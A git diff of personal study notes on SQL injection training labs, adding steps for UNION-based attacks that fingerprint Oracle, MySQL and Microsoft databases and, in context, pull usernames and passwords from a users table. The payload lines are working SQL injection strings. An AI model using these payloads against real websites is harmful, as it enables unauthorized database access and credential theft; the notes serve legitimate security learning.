@@ -43,7 +43,7 @@ get administrator password, and paste into login.
 
 ### SQL injection UNION attack, retrieving multiple values in a single column
 
-intercept cateogry, move to repeater  
+intercept category, move to repeater  
 in repeater find column size  
 '+UNION+SELECT+NULL,'string'--  
 locate string for username/password injection  
@@ -51,3 +51,24 @@ concat username and password into string starr is used to seperate values so you
 '+UNION+SELECT+NULL,username||'\*'||password+FROM+users--  
 right click response show response in browser  
 grab administrator password and login
+
+### Lab: SQL injection attack, querying the database type and version on Oracle
+
+Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
+ex: '+UNION+SELECT+NULL,NULL+FROM+dual--
+check for string data types
+'+UNION+SELECT+'string','string2'+FROM+dual--
+Now look for version by using BANNER, NULL, and v$version from cheatsheet.
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+
+### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+Hint: You can find some useful payloads on our SQL injection cheat sheet.
+for this instead of using '--' at the end, it will be a hash #  
+ex: '+UNION+SELECT+NULL#
+find number of columns and check for strings
+'+UNION+SELECT+'string2','string1'#
+for microsoft @@version  
+ex:'+UNION+SELECT+@@version,NULL#
+
+### SQL injection attack, listing the database contents on non-Oracle databases
